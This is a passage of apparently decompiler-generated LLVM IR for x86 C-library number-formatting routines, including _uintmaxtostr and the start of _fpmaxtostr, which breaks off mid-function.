  %v1_804fdc7 = icmp eq i1 %v6_804fdc1, false
  br i1 %v1_804fdc7, label %dec_label_pc_804fdcd, label %dec_label_pc_804fdc9

dec_label_pc_804fdc9:                             ; preds = %entry
  %v2_804fdc9 = trunc i32 %tmp4 to i8
  %v4_804fdc9 = bitcast i16* %tmp6 to i8*
  store i8 %v2_804fdc9, i8* %v4_804fdc9, align 1
  br label %dec_label_pc_804fdeb

dec_label_pc_804fdcd:                             ; preds = %entry
  %v6_804fdcd = icmp eq i32 %tmp5, 2048
  %v1_804fdd3 = icmp eq i1 %v6_804fdcd, false
  br i1 %v1_804fdd3, label %dec_label_pc_804fddc, label %dec_label_pc_804fdd5

dec_label_pc_804fdd5:                             ; preds = %dec_label_pc_804fdcd
  %sext2 = mul i32 %tmp4, 65536
  %v1_804fdd5 = sdiv i32 %sext2, 65536
  %v3_804fdd5 = bitcast i16* %tmp6 to i32*
  store i32 %v1_804fdd5, i32* %v3_804fdd5, align 4
  %v0_804fdd7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fdd7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fdd7 = add i32 %v1_804fdd7, 4
  %v3_804fdd7 = inttoptr i32 %v2_804fdd7 to i32*
  store i32 %v0_804fdd7, i32* %v3_804fdd7, align 4
  br label %dec_label_pc_804fdeb

dec_label_pc_804fddc:                             ; preds = %dec_label_pc_804fdcd
  %v6_804fddc = icmp eq i32 %tmp5, 512
  %v1_804fde2 = icmp eq i1 %v6_804fddc, false
  br i1 %v1_804fde2, label %dec_label_pc_804fde9, label %dec_label_pc_804fde4

dec_label_pc_804fde4:                             ; preds = %dec_label_pc_804fddc
  store i16 %v4_804fdb9, i16* %tmp6, align 2
  br label %dec_label_pc_804fdeb

dec_label_pc_804fde9:                             ; preds = %dec_label_pc_804fddc
  %sext3 = mul i32 %tmp4, 65536
  %v1_804fde9 = sdiv i32 %sext3, 65536
  %v3_804fde9 = bitcast i16* %tmp6 to i32*
  store i32 %v1_804fde9, i32* %v3_804fde9, align 4
  br label %dec_label_pc_804fdeb

dec_label_pc_804fdeb:                             ; preds = %dec_label_pc_804fde4, %dec_label_pc_804fdd5, %dec_label_pc_804fdc9, %dec_label_pc_804fde9
  %v2_804fdeb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fdeb, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804fdec = sdiv i32 %sext, 65536
  ret i32 %v1_804fdec

; uselistorder directives
  uselistorder i32 512, { 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 5, 14, 6, 7, 8 }
  uselistorder label %dec_label_pc_804fdeb, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_804fdf7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fdf7, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %arg4, i32* %edi.global-to-local, align 4
  %v2_804fe07 = icmp slt i32 %arg4, 0
  %v1_804fe09 = icmp eq i1 %v2_804fe07, false
  br i1 %v1_804fe09, label %dec_label_pc_804fe2a, label %dec_label_pc_804fe0b

dec_label_pc_804fe0b:                             ; preds = %entry
  %v1_804fe0b = sub i32 0, %arg4
  store i32 %v1_804fe0b, i32* %edi.global-to-local, align 4
  %v2_804fe0d = icmp slt i32 %arg3, 0
  %v1_804fe0f = icmp eq i1 %v2_804fe0d, false
  br i1 %v1_804fe0f, label %dec_label_pc_804fe2a, label %dec_label_pc_804fe11

dec_label_pc_804fe11:                             ; preds = %dec_label_pc_804fe0b
  %v1_804fe11 = sub i32 0, %arg2
  %v5_804fe11 = icmp ne i32 %arg2, 0
  store i32 %v1_804fe11, i32* %ecx.global-to-local, align 4
  %v2_804fe13 = zext i1 %v5_804fe11 to i32
  %v3_804fe13 = add i32 %v2_804fe13, %arg3
  %v1_804fe16 = sub i32 0, %v3_804fe13
  store i32 %v1_804fe16, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fe2a

dec_label_pc_804fe2a:                             ; preds = %entry, %dec_label_pc_804fe0b, %dec_label_pc_804fe11
  %storemerge12 = phi i32 [ 1, %dec_label_pc_804fe11 ], [ 0, %dec_label_pc_804fe0b ], [ 0, %entry ]
  store i8 0, i8* %arg1, align 1
  %v0_804fe33 = load i32, i32* %edi.global-to-local, align 4
  %div = udiv i32 -1, %v0_804fe33
  %tmp40 = urem i32 -1, %v0_804fe33
  %v1_804fe39 = add i32 %tmp40, 1
  %v12_804fe3e = icmp eq i32 %v1_804fe39, %v0_804fe33
  %v1_804fe40 = icmp eq i1 %v12_804fe3e, false
  br i1 %v1_804fe40, label %dec_label_pc_804fe4f, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %dec_label_pc_804fe2a
  %v1_804fe42 = add i32 %div, 1
  br label %dec_label_pc_804fe4f

dec_label_pc_804fe4f:                             ; preds = %dec_label_pc_804fe2a, %dec_label_pc_804fe42
  %stack_var_-24.0.off0 = phi i32 [ %v1_804fe39, %dec_label_pc_804fe2a ], [ 0, %dec_label_pc_804fe42 ]
  %stack_var_-28.0 = phi i32 [ %div, %dec_label_pc_804fe2a ], [ %v1_804fe42, %dec_label_pc_804fe42 ]
  %v0_804fe4f = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804fe4f, i32* %esi.global-to-local, align 4
  %v0_804fe51 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fe51, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804feac = urem i32 %arg5, 256
  br label %dec_label_pc_804fe59

dec_label_pc_804fe59:                             ; preds = %dec_label_pc_804feb3, %dec_label_pc_804fe4f
  %v0_804fe9b = phi i32 [ %v0_804fe4f, %dec_label_pc_804fe4f ], [ %v1_804feba, %dec_label_pc_804feb3 ]
  %stack_var_-20.0.off014 = phi i32 [ %v0_804fe51, %dec_label_pc_804fe4f ], [ %stack_var_-20.1.off0, %dec_label_pc_804feb3 ]
  %v5_804fe59 = icmp eq i32 %stack_var_-20.0.off014, 0
  br i1 %v5_804fe59, label %dec_label_pc_804fe9b, label %dec_label_pc_804fe60

dec_label_pc_804fe60:                             ; preds = %dec_label_pc_804fe59
  %v0_804fe66 = load i32, i32* %edi.global-to-local, align 4
  %div8 = udiv i32 %stack_var_-20.0.off014, %v0_804fe66
  %tmp41 = urem i32 %stack_var_-20.0.off014, %v0_804fe66
  %v4_804fe74 = mul i32 %tmp41, %stack_var_-24.0.off0
  %div9 = udiv i32 %v0_804fe9b, %v0_804fe66
  %tmp42 = urem i32 %v0_804fe9b, %v0_804fe66
  %v2_804fe85 = add i32 %tmp42, %v4_804fe74
  %v7_804fe8b = mul i32 %tmp41, %stack_var_-28.0
  store i32 %v7_804fe8b, i32* %ecx.global-to-local, align 4
  %v2_804fe90 = add i32 %div9, %v7_804fe8b
  store i32 %v2_804fe90, i32* %ebx.global-to-local, align 4
  %div10 = udiv i32 %v2_804fe85, %v0_804fe66
  %tmp43 = urem i32 %v2_804fe85, %v0_804fe66
  %v2_804fe96 = add i32 %div10, %v2_804fe90
  br label %dec_label_pc_804fea3

dec_label_pc_804fe9b:                             ; preds = %dec_label_pc_804fe59
  %v0_804fe9f = load i32, i32* %edi.global-to-local, align 4
  %div11 = udiv i32 %v0_804fe9b, %v0_804fe9f
  %tmp44 = urem i32 %v0_804fe9b, %v0_804fe9f
  br label %dec_label_pc_804fea3

dec_label_pc_804fea3:                             ; preds = %dec_label_pc_804fe60, %dec_label_pc_804fe9b
  %v0_804feb0 = phi i32 [ %tmp44, %dec_label_pc_804fe9b ], [ %tmp43, %dec_label_pc_804fe60 ]
  %stack_var_-20.1.off0 = phi i32 [ 0, %dec_label_pc_804fe9b ], [ %div8, %dec_label_pc_804fe60 ]
  %storemerge = phi i32 [ %div11, %dec_label_pc_804fe9b ], [ %v2_804fe96, %dec_label_pc_804fe60 ]
  store i32 %storemerge, i32* %esi.global-to-local, align 4
  %v0_804fea3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fea3 = add i32 %v0_804fea3, -1
  store i32 %v1_804fea3, i32* %ebp.global-to-local, align 4
  %v1_804fea4 = add i32 %v0_804feb0, 48
  %tmp45 = icmp ult i32 %v0_804feb0, 10
  br i1 %tmp45, label %dec_label_pc_804feb3, label %dec_label_pc_804feac

dec_label_pc_804feac:                             ; preds = %dec_label_pc_804fea3
  %v5_804feac = load i32, i32* %ecx.global-to-local, align 4
  %v6_804feac = and i32 %v5_804feac, -256
  %v7_804feac = or i32 %v6_804feac, %v4_804feac
  store i32 %v7_804feac, i32* %ecx.global-to-local, align 4
  %v2_804feb0 = add i32 %v7_804feac, %v0_804feb0
  br label %dec_label_pc_804feb3

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fea3, %dec_label_pc_804feac
  %v0_804feb3 = phi i32 [ %v1_804fea4, %dec_label_pc_804fea3 ], [ %v2_804feb0, %dec_label_pc_804feac ]
  %v1_804feb3 = trunc i32 %v0_804feb3 to i8
  %v3_804feb3 = inttoptr i32 %v1_804fea3 to i8*
  store i8 %v1_804feb3, i8* %v3_804feb3, align 1
  %v1_804feba = load i32, i32* %esi.global-to-local, align 4
  %v2_804feba = or i32 %v1_804feba, %stack_var_-20.1.off0
  %v3_804feba = icmp eq i32 %v2_804feba, 0
  %v1_804febc = icmp eq i1 %v3_804feba, false
  br i1 %v1_804febc, label %dec_label_pc_804fe59, label %dec_label_pc_804febe

dec_label_pc_804febe:                             ; preds = %dec_label_pc_804feb3
  %v4_804febe = icmp eq i32 %storemerge12, 0
  br i1 %v4_804febe, label %dec_label_pc_804feca, label %dec_label_pc_804fec5

dec_label_pc_804fec5:                             ; preds = %dec_label_pc_804febe
  %v0_804fec5 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fec5 = add i32 %v0_804fec5, -1
  store i32 %v1_804fec5, i32* %ebp.global-to-local, align 4
  %v1_804fec6 = inttoptr i32 %v1_804fec5 to i8*
  store i8 45, i8* %v1_804fec6, align 1
  br label %dec_label_pc_804feca

dec_label_pc_804feca:                             ; preds = %dec_label_pc_804febe, %dec_label_pc_804fec5
  %v0_804feca = load i32, i32* %ebp.global-to-local, align 4
  ret i32 %v0_804feca

; uselistorder directives
  uselistorder i32 %v2_804fe85, { 1, 0 }
  uselistorder i32 %v0_804fe66, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %stack_var_-20.0.off014, { 1, 0, 2 }
  uselistorder i32 %v0_804fe9b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804fe39, { 1, 0 }
  uselistorder i32 %div, { 1, 0 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804feca, { 1, 0 }
  uselistorder label %dec_label_pc_804feb3, { 1, 0 }
  uselistorder label %dec_label_pc_804fea3, { 1, 0 }
  uselistorder label %dec_label_pc_804fe4f, { 1, 0 }
  uselistorder label %dec_label_pc_804fe2a, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp99 = call i16 @__decompiler_undefined_function_5()
  %tmp108 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-23 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-67 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fed5 = load i32, i32* @edi, align 4
  %v0_804fed6 = load i32, i32* @esi, align 4
  %v0_804fed7 = load i32, i32* @ebx, align 4
  store i32 %v0_804fed7, i32* %stack_var_-16, align 4
  %v4_804fede = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804fede = add i3 %v4_804fede, -1
  store i3 %v5_804fede, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp108, i32* %eax.global-to-local, align 4
  %v1_804feec = add i32 %tmp108, 4
  %v2_804feec = inttoptr i32 %v1_804feec to i32*
  %v3_804feec = load i32, i32* %v2_804feec, align 4
  store i32 %v3_804feec, i32* %eax.global-to-local, align 4
  store i32 %tmp108, i32* %edx.global-to-local, align 4
  %v1_804fefa = inttoptr i32 %tmp108 to i32*
  %v2_804fefa = load i32, i32* %v1_804fefa, align 4
  store i32 %v2_804fefa, i32* %ebp.global-to-local, align 4
  %v1_804fefc = add i32 %tmp108, 8
  %v2_804fefc = inttoptr i32 %v1_804fefc to i8*
  %v3_804fefc = load i8, i8* %v2_804fefc, align 1
  %v4_804fefc = zext i8 %v3_804fefc to i32
  %v5_804fefc = load i32, i32* @ecx, align 4
  %v6_804fefc = and i32 %v5_804fefc, -256
  %v7_804fefc = or i32 %v6_804fefc, %v4_804fefc
  store i32 %v7_804fefc, i32* %ecx.global-to-local, align 4
  %v3_804ff0b = and i32 %v3_804feec, -256
  %v4_804ff0b = or i32 %v3_804ff0b, %v4_804fefc
  %v1_804ff0d = or i32 %v4_804ff0b, 32
  %v3_804ff0d = trunc i32 %v1_804ff0d to i8
  store i32 %v1_804ff0d, i32* %eax.global-to-local, align 4
  %v10_804ff10 = icmp eq i8 %v3_804ff0d, 97
  %v1_804ff12 = icmp eq i1 %v10_804ff10, false
  br i1 %v1_804ff12, label %dec_label_pc_804ff1b, label %dec_label_pc_804ff14

dec_label_pc_804ff14:                             ; preds = %entry
  %v1_804ff14 = add i32 %v7_804fefc, 6
  %v11_804ff14 = trunc i32 %v1_804ff14 to i8
  store i32 %v1_804ff14, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ff1b

dec_label_pc_804ff1b:                             ; preds = %entry, %dec_label_pc_804ff14
  %stack_var_-186.0 = phi i8 [ %v3_804fefc, %entry ], [ %v11_804ff14, %dec_label_pc_804ff14 ]
  %v2_804ff1b = icmp slt i32 %v2_804fefa, 0
  %v1_804ff1d = icmp eq i1 %v2_804ff1b, false
  br i1 %v1_804ff1d, label %dec_label_pc_804ff24, label %dec_label_pc_804ff1f

dec_label_pc_804ff1f:                             ; preds = %dec_label_pc_804ff1b
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ff24

dec_label_pc_804ff24:                             ; preds = %dec_label_pc_804ff1b, %dec_label_pc_804ff1f
  store i32 0, i32* %stack_var_-22, align 4
  store i32 %tmp108, i32* %edi.global-to-local, align 4
  %v1_804ff33 = add i32 %tmp108, 12
  %v2_804ff33 = inttoptr i32 %v1_804ff33 to i32*
  %v3_804ff33 = load i32, i32* %v2_804ff33, align 4
  store i32 %v3_804ff33, i32* %eax.global-to-local, align 4
  %v2_804ff36 = and i32 %v3_804ff33, 2
  %v3_804ff36 = icmp eq i32 %v2_804ff36, 0
  br i1 %v3_804ff36, label %dec_label_pc_804ff44, label %dec_label_pc_804ff3a

dec_label_pc_804ff3a:                             ; preds = %dec_label_pc_804ff24
  store i32 43, i32* %stack_var_-22, align 4
  br label %dec_label_pc_804ff50

dec_label_pc_804ff44:                             ; preds = %dec_label_pc_804ff24
  %v2_804ff44 = urem i32 %v3_804ff33, 2
  %v3_804ff44 = icmp eq i32 %v2_804ff44, 0
  br i1 %v3_804ff44, label %dec_label_pc_804ff50, label %dec_label_pc_804ff48

dec_label_pc_804ff48:                             ; preds = %dec_label_pc_804ff44
  store i32 32, i32* %stack_var_-22, align 4
  br label %dec_label_pc_804ff50

dec_label_pc_804ff50:                             ; preds = %dec_label_pc_804ff44, %dec_label_pc_804ff3a, %dec_label_pc_804ff48
  %v1_804ff64 = udiv i32 %v3_804ff33, 256
  %tmp = and i32 %v1_804ff64, 68
  %tmp148 = icmp eq i32 %tmp, 64
  br i1 %tmp148, label %dec_label_pc_80500a5, label %dec_label_pc_804ffd6

dec_label_pc_804ffd6:                             ; preds = %dec_label_pc_804ff50
  store i3 %v4_804fede, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp108, i32* %edx.global-to-local, align 4
  %v1_804ffdd = add i32 %tmp108, 16
  %v2_804ffdd = inttoptr i32 %v1_804ffdd to i32*
  store i32 32, i32* %v2_804ffdd, align 4
  store i32 3, i32* %stack_var_-148, align 4
  %v2_8050008 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050008, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503d0

dec_label_pc_80500a5:                             ; preds = %dec_label_pc_804ff50
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_804fede, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80500a5 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_80500a5, i32* %edx.global-to-local, align 4
  %tmp133 = bitcast i32* %stack_var_-66 to i8*
  store i32 0, i32* %esi.global-to-local, align 4
  %v6_80500b6 = and i32 %v3_804ff33, -65536
  %v1_80500bb = udiv i16 %tmp99, 256
  %v2_80500bb = zext i16 %v1_80500bb to i32
  %v3_80500bb = mul nuw nsw i32 %v2_80500bb, 256
  %tmp149 = urem i16 %tmp99, 256
  %v4_80500b6.masked = zext i16 %tmp149 to i32
  %v11_80500bb = or i32 %v4_80500b6.masked, %v3_80500bb
  %v10_80500bb = or i32 %v11_80500bb, %v6_80500b6
  %v12_80500bb = or i32 %v10_80500bb, 3072
  store i32 %v12_80500bb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80500c3

dec_label_pc_80500c3:                             ; preds = %dec_label_pc_8050116.dec_label_pc_80500c3_crit_edge, %dec_label_pc_80500a5
  %v1_80500c3 = phi i3 [ %v5_804fede, %dec_label_pc_80500a5 ], [ %v1_80500c3.pre, %dec_label_pc_8050116.dec_label_pc_80500c3_crit_edge ]
  %v2_80500e1 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_80500a5 ], [ %v0_80500c3.pre, %dec_label_pc_8050116.dec_label_pc_80500c3_crit_edge ]
  %stack_var_-192.0 = phi i8* [ %tmp133, %dec_label_pc_80500a5 ], [ %v23_80500e9, %dec_label_pc_8050116.dec_label_pc_80500c3_crit_edge ]
  %tmp150 = fptosi x86_fp80 %v2_80500e1 to i32
  store i32 %tmp150, i32* %eax.global-to-local, align 4
  store i32 %tmp150, i32* %edi.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v5_80500db = sitofp i32 %tmp150 to x86_fp80
  %v4_80500e1 = fsub x86_fp80 %v2_80500e1, %v5_80500db
  store i3 %v1_80500c3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80500e3 = fmul x86_fp80 %v4_80500e1, 0xK401CEE6B280000000000
  store x86_fp80 %v4_80500e3, x86_fp80* %st0.global-to-local, align 4
  %v4_80500e9 = ptrtoint i8* %stack_var_-192.0 to i32
  %v5_80500e9 = add i32 %v4_80500e9, 9
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80500f0

dec_label_pc_80500f0:                             ; preds = %dec_label_pc_80500f0.dec_label_pc_80500f0_crit_edge, %dec_label_pc_80500c3
  %v0_80500ff = phi i32 [ %v0_80500ff.pre, %dec_label_pc_80500f0.dec_label_pc_80500f0_crit_edge ], [ %tmp150, %dec_label_pc_80500c3 ]
  %v0_80500f0 = phi i32 [ %v0_8050111, %dec_label_pc_80500f0.dec_label_pc_80500f0_crit_edge ], [ 0, %dec_label_pc_80500c3 ]
  %v1_80500f0 = add i32 %v0_80500f0, 1
  store i32 %v1_80500f0, i32* %ebx.global-to-local, align 4
  %v2_80500f5 = sub i32 %v5_80500e9, %v1_80500f0
  %v4_80500f7 = inttoptr i32 %v2_80500f5 to i8*
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_80500ff, 10
  %tmp134 = urem i32 %v0_80500ff, 10
  store i32 %div, i32* %edi.global-to-local, align 4
  %v1_8050109 = or i32 %tmp134, 48
  %v8_8050109 = trunc i32 %v1_8050109 to i8
  store i32 %v1_8050109, i32* %edx.global-to-local, align 4
  store i32 %v2_80500f5, i32* %eax.global-to-local, align 4
  store i8 %v8_8050109, i8* %v4_80500f7, align 1
  %v0_8050111 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8050114 = icmp sgt i32 %v0_8050111, 8
  br i1 %v7_8050114, label %dec_label_pc_8050116, label %dec_label_pc_80500f0.dec_label_pc_80500f0_crit_edge

dec_label_pc_80500f0.dec_label_pc_80500f0_crit_edge: ; preds = %dec_label_pc_80500f0
  %v0_80500ff.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80500f0

dec_label_pc_8050116:                             ; preds = %dec_label_pc_80500f0
  %v0_8050116 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050116 = add i32 %v0_8050116, 1
  store i32 %v1_8050116, i32* %esi.global-to-local, align 4
  %v7_805011a = icmp sgt i32 %v1_8050116, 2
  br i1 %v7_805011a, label %dec_label_pc_805011c, label %dec_label_pc_8050116.dec_label_pc_80500c3_crit_edge

dec_label_pc_8050116.dec_label_pc_80500c3_crit_edge: ; preds = %dec_label_pc_8050116
  %v23_80500e9 = inttoptr i32 %v5_80500e9 to i8*
  %v0_80500c3.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v1_80500c3.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80500c3

dec_label_pc_805011c:                             ; preds = %dec_label_pc_8050116
  %v0_805011c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_805011c = add i3 %v0_805011c, 1
  store i3 %v2_805011c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8050123 = icmp ugt i8 %stack_var_-186.0, 96
  %v4_805012d = add i8 %stack_var_-186.0, 32
  %.141 = select i1 %v6_8050123, i8 101, i8 69
  %stack_var_-186.0.v4_805012d = select i1 %v6_8050123, i8 %stack_var_-186.0, i8 %v4_805012d
  %v12_8050132 = icmp eq i8 %stack_var_-186.0.v4_805012d, 103
  %v1_8050137 = icmp eq i1 %v12_8050132, false
  br i1 %v1_8050137, label %dec_label_pc_8050140, label %dec_label_pc_8050139

dec_label_pc_8050139:                             ; preds = %dec_label_pc_805011c
  %v0_8050139 = load i32, i32* %ebp.global-to-local, align 4
  %tmp135 = icmp slt i32 %v0_8050139, 1
  br i1 %tmp135, label %dec_label_pc_8050147, label %dec_label_pc_805013d

dec_label_pc_805013d:                             ; preds = %dec_label_pc_8050139
  %v1_805013d = add i32 %v0_8050139, -1
  store i32 %v1_805013d, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050147

dec_label_pc_8050140:                             ; preds = %dec_label_pc_805011c
  %v12_8050140 = icmp eq i8 %stack_var_-186.0.v4_805012d, 102
  br i1 %v12_8050140, label %dec_label_pc_805014b, label %dec_label_pc_8050140.dec_label_pc_8050147_crit_edge

dec_label_pc_8050140.dec_label_pc_8050147_crit_edge: ; preds = %dec_label_pc_8050140
  %v0_8050147.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050147

dec_label_pc_8050147:                             ; preds = %dec_label_pc_8050140.dec_label_pc_8050147_crit_edge, %dec_label_pc_8050139, %dec_label_pc_805013d
  %v0_8050147 = phi i32 [ %v0_8050147.pre, %dec_label_pc_8050140.dec_label_pc_8050147_crit_edge ], [ %v0_8050139, %dec_label_pc_8050139 ], [ %v1_805013d, %dec_label_pc_805013d ]
  store i32 %v0_8050147, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050175

dec_label_pc_805014b:                             ; preds = %dec_label_pc_8050140
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_805014f = load i32, i32* %ebp.global-to-local, align 4
  %v2_805014f = add i32 %v0_805014f, -1
  store i32 %v2_805014f, i32* %edi.global-to-local, align 4
  %v5_8050156 = icmp slt i32 %v2_805014f, -1
  br i1 %v5_8050156, label %dec_label_pc_8050175.thread, label %dec_label_pc_8050175

dec_label_pc_8050175.thread:                      ; preds = %dec_label_pc_805014b
  store i32 808464432, i32* %eax.global-to-local, align 4
  %v2_805015d = ptrtoint i32* %stack_var_-68 to i32
  %v4_8050164 = load i1, i1* @df, align 1
  %v5_8050164 = select i1 %v4_8050164, i32 -4, i32 4
  %v6_8050164 = add i32 %v5_8050164, %v2_805015d
  store i32 %v6_8050164, i32* %edi.global-to-local, align 4
  %v2_8050165 = inttoptr i32 %v6_8050164 to i32*
  store i32 808464432, i32* %v2_8050165, align 4
  %v3_8050165 = load i32, i32* %edi.global-to-local, align 4
  %v6_8050165 = add i32 %v3_8050165, %v5_8050164
  store i32 %v6_8050165, i32* %edi.global-to-local, align 4
  %v0_8050166 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050166 = inttoptr i32 %v6_8050165 to i32*
  store i32 %v0_8050166, i32* %v2_8050166, align 4
  %v3_8050166 = load i32, i32* %edi.global-to-local, align 4
  %v6_8050166 = add i32 %v3_8050166, %v5_8050164
  store i32 %v6_8050166, i32* %edi.global-to-local, align 4
  %v0_8050167 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050167 = inttoptr i32 %v6_8050166 to i32*
  store i32 %v0_8050167, i32* %v2_8050167, align 4
  %v3_8050167 = load i32, i32* %edi.global-to-local, align 4
  %v6_8050167 = add i32 %v3_8050167, %v5_8050164
  store i32 %v6_8050167, i32* %edi.global-to-local, align 4
  %v0_8050168 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050168 = inttoptr i32 %v6_8050167 to i32*
  store i32 %v0_8050168, i32* %v2_8050168, align 4
  %v3_8050168 = load i32, i32* %edi.global-to-local, align 4
  %v6_8050168 = add i32 %v3_8050168, %v5_8050164
  %v0_8050169 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050169 = trunc i32 %v0_8050169 to i8
  %v3_8050169 = inttoptr i32 %v6_8050168 to i8*
  store i8 %v1_8050169, i8* %v3_8050169, align 1
  store i32 -1, i32* %edi.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 48, i32* %stack_var_-67, align 4
  br label %dec_label_pc_8050195

dec_label_pc_8050175:                             ; preds = %dec_label_pc_805014b, %dec_label_pc_8050147
  %v1_8050195 = phi i32 [ %v0_8050147, %dec_label_pc_8050147 ], [ %v2_805014f, %dec_label_pc_805014b ]
  store i32 0, i32* %stack_var_-68, align 4
  store i32 48, i32* %stack_var_-67, align 4
  %v7_8050188 = icmp sgt i32 %v1_8050195, 20
  br i1 %v7_8050188, label %dec_label_pc_805018a, label %dec_label_pc_8050195

dec_label_pc_805018a:                             ; preds = %dec_label_pc_8050175
  %v2_805018a = ptrtoint i32* %stack_var_-45 to i32
  store i32 %v2_805018a, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80501a9.preheader

dec_label_pc_8050195:                             ; preds = %dec_label_pc_8050175.thread, %dec_label_pc_8050175
  %v1_8050195144 = phi i32 [ -1, %dec_label_pc_8050175.thread ], [ %v1_8050195, %dec_label_pc_8050175 ]
  %v0_8050195 = load i32, i32* @esp, align 4
  %v2_8050195 = add i32 %v1_8050195144, 145
  %v3_8050195 = add i32 %v2_8050195, %v0_8050195
  store i32 %v3_8050195, i32* %eax.global-to-local, align 4
  %v1_805019c = add i32 %v3_8050195, 2
  store i32 %v1_805019c, i32* %ecx.global-to-local, align 4
  %v2_805019f = inttoptr i32 %v1_805019c to i8*
  %v3_805019f = load i8, i8* %v2_805019f, align 1
  %v8_805019f = icmp ult i8 %v3_805019f, 53
  %v1_80501a3 = icmp eq i1 %v8_805019f, false
  %v2_80501a3 = zext i1 %v1_80501a3 to i32
  br label %dec_label_pc_80501a9.preheader

dec_label_pc_80501a9.preheader:                   ; preds = %dec_label_pc_8050195, %dec_label_pc_805018a
  %v0_80501a960 = phi i32 [ %v1_805019c, %dec_label_pc_8050195 ], [ %v2_805018a, %dec_label_pc_805018a ]
  %storemerge50 = phi i32 [ %v2_80501a3, %dec_label_pc_8050195 ], [ 0, %dec_label_pc_805018a ]
  store i32 %storemerge50, i32* %eax.global-to-local, align 4
  %v4_80501aa.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80501a9

dec_label_pc_80501a9:                             ; preds = %dec_label_pc_80501a9.backedge, %dec_label_pc_80501a9.preheader
